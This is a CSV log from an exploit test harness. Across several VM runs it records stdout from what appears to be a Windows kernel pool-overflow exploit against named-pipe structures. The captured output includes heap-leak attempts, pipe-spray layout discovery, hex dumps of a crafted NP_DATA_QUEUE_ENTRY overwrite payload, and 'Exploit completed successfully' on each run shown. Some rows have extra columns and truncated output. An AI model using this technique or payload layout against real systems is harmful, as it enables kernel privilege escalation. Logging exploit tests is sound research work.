timestamp,boot_index,run_index,runs_this_boot,vm_state_before,vm_state_after,remote_ready_before,outcome,exit_code,duration_seconds,stdout_tail,stderr_tail,note
2026-06-09T06:11:19+00:00,1,1,1,running,running,True,success,0,7.172,"HARNESS_EXIT_CODE=0
HARNESS_GUEST_SECONDS=7
","#< CLIXML
    [000001E758005F20]  42536F490A100000  1DED768E3960FC1F
    [000001E758005F30]  E212DD018DDE5CAF  0000000000000000
    [000001E758005F40]  0000000000000000  0000000000000000
    [000001E758005F50]  42536F490E0D0003  0000000000000000
    [000001E758005F60]  000000000000000C  FFFFE3084DC54880
    [000001E758005F70]  00000000000003E8  6161616161616161
    [000001E758005F80]  6161616161616161  6161616161616161
    [000001E758005F90]  6161616161616161  6161616161616161
    [000001E758005FA0]  6161616161616161  6161616161616161
    [000001E758005FB0]  6161616161616161  6161616161616161
    [000001E758005FC0]  6161616161616161  6161616161616161
    [000001E758005FD0]  6161616161616161  6161616161616161
    [000001E758005FE0]  6161616161616161  6161616161616161
    [000001E758005FF0]  6161616161616161  6161616161616161
    [000001E758006000]  6161616161616161  6161616161616161
    [000001E758006010]  0000000000000000  0000000000000000
    [000001E758006020]  7246704E0A100000  1DED768E3960FD1F
    [000001E758006030]  FFFFE3084DB39488  FFFFE3084DB39488
    [000001E758006040]  0000000000000000  FFFFE3084BE1C8A0
    [000001E758006050]  000000C000000000  00000000000000C0
    [000001E758006060]  0000000845504950  3939393939393939
    [000001E758006070]  3939393939393939  3939393939393939
    [000001E758006080]  3939393939393939  3939393939393939
    [000001E758006090]  3939393939393939  3939393939393939
    [000001E7580060A0]  3939393939393939  3939393939393939
    [000001E7580060B0]  3939393939393939  3939393939393939
    [000001E7580060C0]  3939393939393939  3939393939393939
    [000001E7580060D0]  3939393939393939  3939393939393939
    [000001E7580060E0]  3939393939393939  3939393939393939
    [000001E7580060F0]  3939393939393939  3939393939393939
    [000001E758006100]  3939393939393939  3939393939393939
    [000001E758006110]  3939393939393939  3939393939393939
    [000001E758006120]  7246704E0A100000  1DED768E3960FE1F
    [000001E758006130]  FFFFE3084E1286A8  FFFFE3084E1286A8
 [*] Prepared payload to overwrite NP_DATA_QUEUE_ENTRY at offset 0x10 within leaked chunk
    [000001E757E9BDB0]  7246704E0A100000  1DED768E3960FD1F
    [000001E757E9BDC0]  FFFFE3084DB39488  FFFFE3084DB39488
    [000001E757E9BDD0]  000001E757AEFE50  FFFFE3084BE1C8A0
    [000001E757E9BDE0]  000000C000000001  
 [*] Full payload to trigger overflow:
    [000001E757E9BDA0]  0000000000000000  0000000000000000
    [000001E757E9BDB0]  7246704E0A100000  1DED768E3960FD1F
    [000001E757E9BDC0]  FFFFE3084DB39488  FFFFE3084DB39488
    [000001E757E9BDD0]  000001E757AEFE50  FFFFE3084BE1C8A0
    [000001E757E9BDE0]  000000C000000001  00000000000000C0
    [000001E757E9BDF0]  0000000845504950  3939393939393939
    [000001E757E9BE00]  3939393939393939  
 [*] Exploit completed successfully.

HARNESS_EXIT_CODE=
HARNESS_GUEST_SECONDS=9
","#< CLIXML
<Objs Version=""1.1.0.1"" xmlns=""http://schemas.microsoft.com/powershell/2004/04""><Obj S=""progress"" RefId=""0""><TN RefId=""0""><T>System.Management.Automation.PSCustomObject</T><T>System.Object</T></TN><MS><I64 N=""SourceId"">1</I64><PR N=""Record""><AV>Preparing modules for first use.</AV><AI>0</AI><Nil /><PI>-1</PI><PC>-1</PC><T>Completed</T><SR>-1</SR><SD> </SD></PR></MS></Obj><Obj S=""progress"" RefId=""1""><TNRef RefId=""0"" /><MS><I64 N=""SourceId"">1</I64><PR N=""Record""><AV>Preparing modules for first use.</AV><AI>0</AI><Nil /><PI>-1</PI><PC>-1</PC><T>Completed</T><SR>-1</SR><SD> </SD></PR></MS></Obj></Objs>",
2026-06-09T06:28:28+00:00,1,3,3,running,running,True,success,0,21.125,True,True,79,28.481,1,65,14,2,"h=2792 bufSize=65536
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] IoSB attempt 13 for capture 2
 [*] Priming overflow with chunk size: 0x100
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] IoSB attempt 14 for capture 2
 [*] Priming overflow with chunk size: 0x100
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] Confirmed 2 IoSB candidates before pipe allocation on capture 1 IoSB attempt 13 leak 0
 [*] Pipe allocation attempt 1/16 after confirmed IoSB
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] Same leak has 2 IoSB and 9 NpFr candidates on pipe leak 0
 [*] Found layout in same leak: IoSB=804 NpFr=904 pipeBase=900 pipeIndex=971 capture=1 iosbAttempt=13 pipeAttempt=0 pipeLeak=0
    [000001803CBCC8A0]  42536F490A100000  1DED768E03517D1F
    [000001803CBCC8B0]  E212DD01988C0DAF  0000000000000000
    [000001803CBCC8C0]  0000000000000000  0000000000000000
    [000001803CBCC8D0]  42536F490E0D0003  0000000000000000
    [000001803CBCC8E0]  000000000000000C  FFFFE3084DE638D0
    [000001803CBCC8F0]  00000000000003E8  6161616161616161
    [000001803CBCC900]  6161616161616161  6161616161616161
    [000001803CBCC910]  6161616161616161  6161616161616161
    [000001803CBCC920]  6161616161616161  6161616161616161
    [000001803CBCC930]  6161616161616161  6161616161616161
    [000001803CBCC940]  6161616161616161  6161616161616161
    [000001803CBCC950]  6161616161616161  6161616161616161
    [000001803CBCC960]  6161616161616161  6161616161616161
    [000001803CBCC970]  6161616161616161  6161616161616161
    [000001803CBCC980]  6161616161616161  6161616161616161
    [000001803CBCC990]  0000000000000000  0000000000000000
    [000001803CBCC9A0]  7246704E0A100000  1DED768E03517E1F
    [000001803CBCC9B0]  FFFFE3084E78E2A8  FFFFE3084E78E2A8
    [000001803CBCC9C0]  0000000000000000  FFFFE3084E144080
    [000001803CBCC9D0]  000000C000000000  00000000000000C0
    [000001803CBCC9E0]  000003CB45504950  3939393939393939
    [000001803CBCC9F0]  3939393939393939  3939393939393939
    [000001803CBCCA00]  3939393939393939  3939393939393939
    [000001803CBCCA10]  3939393939393939  3939393939393939
    [000001803CBCCA20]  3939393939393939  3939393939393939
    [000001803CBCCA30]  3939393939393939  3939393939393939
    [000001803CBCCA40]  3939393939393939  3939393939393939
    [000001803CBCCA50]  3939393939393939  3939393939393939
    [000001803CBCCA60]  3939393939393939  3939393939393939
    [000001803CBCCA70]  3939393939393939  3939393939393939
    [000001803CBCCA80]  3939393939393939  3939393939393939
    [000001803CBCCA90]  3939393939393939  DDDDDDDDFDFDFDFD
 [*] Prepared payload to overwrite NP_DATA_QUEUE_ENTRY at offset 0x10 within leaked chunk
    [000001803CA7AA80]  7246704E0A100000  1DED768E03517E1F
    [000001803CA7AA90]  FFFFE3084E78E2A8  FFFFE3084E78E2A8
    [000001803CA7AAA0]  000001803C613A90  FFFFE3084E144080
    [000001803CA7AAB0]  000000C000000001  
 [*] Full payload to trigger overflow:
    [000001803CA7AA70]  0000000000000000  0000000000000000
    [000001803CA7AA80]  7246704E0A100000  1DED768E03517E1F
    [000001803CA7AA90]  FFFFE3084E78E2A8  FFFFE3084E78E2A8
    [000001803CA7AAA0]  000001803C613A90  FFFFE3084E144080
    [000001803CA7AAB0]  000000C000000001  
 [*] Exploit completed successfully.

HARNESS_EXIT_CODE=
HARNESS_GUEST_SECONDS=25
","#< CLIXML
<Objs Version=""1.1.0.1"" xmlns=""http://schemas.microsoft.com/powershell/2004/04""><Obj S=""progress"" RefId=""0""><TN RefId=""0""><T>System.Management.Automation.PSCustomObject</T><T>System.Object</T></TN><MS><I64 N=""SourceId"">1</I64><PR N=""Record""><AV>Preparing modules for first use.</AV><AI>0</AI><Nil /><PI>-1</PI><PC>-1</PC><T>Completed</T><SR>-1</SR><SD> </SD></PR></MS></Obj><Obj S=""progress"" RefId=""1""><TNRef RefId=""0"" /><MS><I64 N=""SourceId"">1</I64><PR N=""Record""><AV>Preparing modules for first use.</AV><AI>0</AI><Nil /><PI>-1</PI><PC>-1</PC><T>Completed</T><SR>-1</SR><SD> </SD></PR></MS></Obj></Objs>",
2026-06-09T06:28:36+00:00,1,4,4,running,running,True,success,0,6.235,True,True,11,6.0,1,11,11,1,"gth=2792 bufSize=65536
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] IoSB attempt 10 for capture 1
 [*] Priming overflow with chunk size: 0x100
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] IoSB attempt 11 for capture 1
 [*] Priming overflow with chunk size: 0x100
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] Confirmed 2 IoSB candidates before pipe allocation on capture 0 IoSB attempt 10 leak 0
 [*] Pipe allocation attempt 1/16 after confirmed IoSB
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] Same leak has 2 IoSB and 8 NpFr candidates on pipe leak 0
 [*] Found layout in same leak: IoSB=804 NpFr=904 pipeBase=900 pipeIndex=36 capture=0 iosbAttempt=10 pipeAttempt=0 pipeLeak=0
    [000001DEB2346B90]  42536F490A100000  1DED768E1BE6301F
    [000001DEB2346BA0]  E212DD0187E250AF  0000000000000000
    [000001DEB2346BB0]  0000000000000000  0000000000000000
    [000001DEB2346BC0]  42536F490E0D0003  0000000000000000
    [000001DEB2346BD0]  000000000000000C  FFFFE3084E8B8620
    [000001DEB2346BE0]  00000000000003E8  6161616161616161
    [000001DEB2346BF0]  6161616161616161  6161616161616161
    [000001DEB2346C00]  6161616161616161  6161616161616161
    [000001DEB2346C10]  6161616161616161  6161616161616161
    [000001DEB2346C20]  6161616161616161  6161616161616161
    [000001DEB2346C30]  6161616161616161  6161616161616161
    [000001DEB2346C40]  6161616161616161  6161616161616161
    [000001DEB2346C50]  6161616161616161  6161616161616161
    [000001DEB2346C60]  6161616161616161  6161616161616161
    [000001DEB2346C70]  6161616161616161  6161616161616161
    [000001DEB2346C80]  0000000000000000  0000000000000000
    [000001DEB2346C90]  7246704E0A100000  1DED768E1BE6311F
    [000001DEB2346CA0]  FFFFE3084E85F368  FFFFE3084E85F368
    [000001DEB2346CB0]  0000000000000000  FFFFE3084CA2DD60
    [000001DEB2346CC0]  000000C000000000  00000000000000C0
    [000001DEB2346CD0]  0000002445504950  3939393939393939
    [000001DEB2346CE0]  3939393939393939  3939393939393939
    [000001DEB2346CF0]  3939393939393939  3939393939393939
    [000001DEB2346D00]  3939393939393939  3939393939393939
    [000001DEB2346D10]  3939393939393939  3939393939393939
    [000001DEB2346D20]  3939393939393939  3939393939393939
    [000001DEB2346D30]  3939393939393939  3939393939393939
    [000001DEB2346D40]  3939393939393939  3939393939393939
    [000001DEB2346D50]  3939393939393939  3939393939393939
    [000001DEB2346D60]  3939393939393939  3939393939393939
    [000001DEB2346D70]  3939393939393939  3939393939393939
    [000001DEB2346D80]  3939393939393939  DDDDDDDDFDFDFDFD
 [*] Prepared payload to overwrite NP_DATA_QUEUE_ENTRY at offset 0x10 within leaked chunk
    [000001DEB2911370]  7246704E0A100000  1DED768E1BE6311F
    [000001DEB2911380]  FFFFE3084E85F368  FFFFE3084E85F368
    [000001DEB2911390]  000001DEB23305B0  FFFFE3084CA2DD60
    [000001DEB29113A0]  000000C000000001  
 [*] Full payload to trigger overflow:
    [000001DEB2911360]  0000000000000000  0000000000000000
    [000001DEB2911370]  7246704E0A100000  1DED768E1BE6311F
    [000001DEB2911380]  FFFFE3084E85F368  FFFFE3084E85F368
    [000001DEB2911390]  000001DEB23305B0  FFFFE3084CA2DD60
    [000001DEB29113A0]  000000C000000001  
 [*] Exploit completed successfully.

HARNESS_EXIT_CODE=
HARNESS_GUEST_SECONDS=7
","#< CLIXML
<Objs Version=""1.1.0.1"" xmlns=""http://schemas.microsoft.com/powershell/2004/04""><Obj S=""progress"" RefId=""0""><TN RefId=""0""><T>System.Management.Automation.PSCustomObject</T><T>System.Object</T></TN><MS><I64 N=""SourceId"">1</I64><PR N=""Record""><AV>Preparing modules for first use.</AV><AI>0</AI><Nil /><PI>-1</PI><PC>-1</PC><T>Completed</T><SR>-1</SR><SD> </SD></PR></MS></Obj><Obj S=""progress"" RefId=""1""><TNRef RefId=""0"" /><MS><I64 N=""SourceId"">1</I64><PR N=""Record""><AV>Preparing modules for first use.</AV><AI>0</AI><Nil /><PI>-1</PI><PC>-1</PC><T>Completed</T><SR>-1</SR><SD> </SD></PR></MS></Obj></Objs>",
2026-06-09T06:28:44+00:00,1,5,5,running,running,True,success,0,7.578,True,True,69,31.232,1,65,4,2," IoSB attempt 3 for capture 2
 [*] Priming overflow with chunk size: 0x100
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] IoSB attempt 4 for capture 2
 [*] Priming overflow with chunk size: 0x100
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] Confirmed 2 IoSB candidates before pipe allocation on capture 1 IoSB attempt 3 leak 0
 [*] Pipe allocation attempt 1/16 after confirmed IoSB
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] Same leak has 2 IoSB and 9 NpFr candidates on pipe leak 0
 [*] Found layout in same leak: IoSB=4 NpFr=104 pipeBase=100 pipeIndex=988 capture=1 iosbAttempt=3 pipeAttempt=0 pipeLeak=0
    [00000203E05DF3E0]  42536F490A100000  1DED768E0366C81F
    [00000203E05DF3F0]  E212DD01988DB8AF  0000000000000000
    [00000203E05DF400]  0000000000000000  0000000000000000
    [00000203E05DF410]  42536F490E0D0003  0000000000000000
    [00000203E05DF420]  000000000000000C  FFFFE3084E8C4590
    [00000203E05DF430]  00000000000003E8  6161616161616161
    [00000203E05DF440]  6161616161616161  6161616161616161
    [00000203E05DF450]  6161616161616161  6161616161616161
    [00000203E05DF460]  6161616161616161  6161616161616161
    [00000203E05DF470]  6161616161616161  6161616161616161
    [00000203E05DF480]  6161616161616161  6161616161616161
    [00000203E05DF490]  6161616161616161  6161616161616161
    [00000203E05DF4A0]  6161616161616161  6161616161616161
    [00000203E05DF4B0]  6161616161616161  6161616161616161
    [00000203E05DF4C0]  6161616161616161  6161616161616161
    [00000203E05DF4D0]  0000000000000000  0000000000000000
    [00000203E05DF4E0]  7246704E0A100000  1DED768E0366C91F
    [00000203E05DF4F0]  FFFFE3084E262368  FFFFE3084E262368
    [00000203E05DF500]  0000000000000000  FFFFE3084EBB3A20
    [00000203E05DF510]  000000C000000000  00000000000000C0
    [00000203E05DF520]  000003DC45504950  3939393939393939
    [00000203E05DF530]  3939393939393939  3939393939393939
    [00000203E05DF540]  3939393939393939  3939393939393939
    [00000203E05DF550]  3939393939393939  3939393939393939
    [00000203E05DF560]  3939393939393939  3939393939393939
    [00000203E05DF570]  3939393939393939  3939393939393939
    [00000203E05DF580]  3939393939393939  3939393939393939
    [00000203E05DF590]  3939393939393939  3939393939393939
    [00000203E05DF5A0]  3939393939393939  3939393939393939
    [00000203E05DF5B0]  3939393939393939  3939393939393939
    [00000203E05DF5C0]  3939393939393939  3939393939393939
    [00000203E05DF5D0]  3939393939393939  3939393939393939
    [00000203E05DF5E0]  7246704E0A100000  1DED768E0366CA1F
    [00000203E05DF5F0]  FFFFE3084E25FDE8  FFFFE3084E25FDE8
 [*] Prepared payload to overwrite NP_DATA_QUEUE_ENTRY at offset 0x10 within leaked chunk
    [00000203E05DF650]  7246704E0A100000  1DED768E0366C91F
    [00000203E05DF660]  FFFFE3084E262368  FFFFE3084E262368
    [00000203E05DF670]  00000203E0040610  FFFFE3084EBB3A20
    [00000203E05DF680]  000000C000000001  
 [*] Full payload to trigger overflow:
    [00000203E05DF640]  0000000000000000  0000000000000000
    [00000203E05DF650]  7246704E0A100000  1DED768E0366C91F
    [00000203E05DF660]  FFFFE3084E262368  FFFFE3084E262368
    [00000203E05DF670]  00000203E0040610  FFFFE3084EBB3A20
    [00000203E05DF680]  000000C000000001  00000000000000C0
    [00000203E05DF690]  000003DC45504950  3939393939393939
    [00000203E05DF6A0]  3939393939393939  
 [*] Exploit completed successfully.

HARNESS_EXIT_CODE=
HARNESS_GUEST_SECONDS=7
","#< CLIXML
<Objs Version=""1.1.0.1"" xmlns=""http://schemas.microsoft.com/powershell/2004/04""><Obj S=""progress"" RefId=""0""><TN RefId=""0""><T>System.Management.Automation.PSCustomObject</T><T>System.Object</T></TN><MS><I64 N=""SourceId"">1</I64><PR N=""Record""><AV>Preparing modules for first use.</AV><AI>0</AI><Nil /><PI>-1</PI><PC>-1</PC><T>Completed</T><SR>-1</SR><SD> </SD></PR></MS></Obj><Obj S=""progress"" RefId=""1""><TNRef RefId=""0"" /><MS><I64 N=""SourceId"">1</I64><PR N=""Record""><AV>Preparing modules for first use.</AV><AI>0</AI><Nil /><PI>-1</PI><PC>-1</PC><T>Completed</T><SR>-1</SR><SD> </SD></PR></MS></Obj></Objs>",
2026-06-09T06:29:01+00:00,1,6,6,running,running,True,success,0,15.453,True,True,263,32.646,1,65,3,5,"oSB attempt 2 for capture 5
 [*] Priming overflow with chunk size: 0x100
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] IoSB attempt 3 for capture 5
 [*] Priming overflow with chunk size: 0x100
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] Confirmed 2 IoSB candidates before pipe allocation on capture 4 IoSB attempt 2 leak 0
 [*] Pipe allocation attempt 1/16 after confirmed IoSB
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] Same leak has 2 IoSB and 9 NpFr candidates on pipe leak 0
 [*] Found layout in same leak: IoSB=504 NpFr=604 pipeBase=600 pipeIndex=10 capture=4 iosbAttempt=2 pipeAttempt=0 pipeLeak=0
    [0000024611B74F80]  42536F490A100000  1DED768E0551F41F
    [0000024611B74F90]  E212DD01988DB4AF  0000000000000000
    [0000024611B74FA0]  0000000000000000  0000000000000000
    [0000024611B74FB0]  42536F490E0D0003  0000000000000000
    [0000024611B74FC0]  000000000000000C  FFFFE3084E8B8470
    [0000024611B74FD0]  00000000000003E8  6161616161616161
    [0000024611B74FE0]  6161616161616161  6161616161616161
    [0000024611B74FF0]  6161616161616161  6161616161616161
    [0000024611B75000]  6161616161616161  6161616161616161
    [0000024611B75010]  6161616161616161  6161616161616161
    [0000024611B75020]  6161616161616161  6161616161616161
    [0000024611B75030]  6161616161616161  6161616161616161
    [0000024611B75040]  6161616161616161  6161616161616161
    [0000024611B75050]  6161616161616161  6161616161616161
    [0000024611B75060]  6161616161616161  6161616161616161
    [0000024611B75070]  0000000000000000  0000000000000000
    [0000024611B75080]  7246704E0A100000  1DED768E0551F51F
    [0000024611B75090]  FFFFE3084C0827C8  FFFFE3084C0827C8
    [0000024611B750A0]  0000000000000000  FFFFE3084BE233E0
    [0000024611B750B0]  000000C000000000  00000000000000C0
    [0000024611B750C0]  0000000A45504950  3939393939393939
    [0000024611B750D0]  3939393939393939  3939393939393939
    [0000024611B750E0]  3939393939393939  3939393939393939
    [0000024611B750F0]  3939393939393939  3939393939393939
    [0000024611B75100]  3939393939393939  3939393939393939
    [0000024611B75110]  3939393939393939  3939393939393939
    [0000024611B75120]  3939393939393939  3939393939393939
    [0000024611B75130]  3939393939393939  3939393939393939
    [0000024611B75140]  3939393939393939  3939393939393939
    [0000024611B75150]  3939393939393939  3939393939393939
    [0000024611B75160]  3939393939393939  3939393939393939
    [0000024611B75170]  3939393939393939  3939393939393939
    [0000024611B75180]  7246704E0A100000  1DED768E0551F61F
    [0000024611B75190]  FFFFE3084E85AC28  FFFFE3084E85AC28
 [*] Prepared payload to overwrite NP_DATA_QUEUE_ENTRY at offset 0x10 within leaked chunk
    [0000024611C870A0]  7246704E0A100000  1DED768E0551F51F
    [0000024611C870B0]  FFFFE3084C0827C8  FFFFE3084C0827C8
    [0000024611C870C0]  000002461172F8B0  FFFFE3084BE233E0
    [0000024611C870D0]  000000C000000001  
 [*] Full payload to trigger overflow:
    [0000024611C87090]  0000000000000000  0000000000000000
    [0000024611C870A0]  7246704E0A100000  1DED768E0551F51F
    [0000024611C870B0]  FFFFE3084C0827C8  FFFFE3084C0827C8
    [0000024611C870C0]  000002461172F8B0  FFFFE3084BE233E0
    [0000024611C870D0]  000000C000000001  00000000000000C0
    [0000024611C870E0]  0000000A45504950  3939393939393939
    [0000024611C870F0]  3939393939393939  
 [*] Exploit completed successfully.

HARNESS_EXIT_CODE=
HARNESS_GUEST_SECONDS=14
","#< CLIXML
<Objs Version=""1.1.0.1"" xmlns=""http://schemas.microsoft.com/powershell/2004/04""><Obj S=""progress"" RefId=""0""><TN RefId=""0""><T>System.Management.Automation.PSCustomObject</T><T>System.Object</T></TN><MS><I64 N=""SourceId"">1</I64><PR N=""Record""><AV>Preparing modules for first use.</AV><AI>0</AI><Nil /><PI>-1</PI><PC>-1</PC><T>Completed</T><SR>-1</SR><SD> </SD></PR></MS></Obj><Obj S=""progress"" RefId=""1""><TNRef RefId=""0"" /><MS><I64 N=""SourceId"">1</I64><PR N=""Record""><AV>Preparing modules for first use.</AV><AI>0</AI><Nil /><PI>-1</PI><PC>-1</PC><T>Completed</T><SR>-1</SR><SD> </SD></PR></MS></Obj></Objs>",
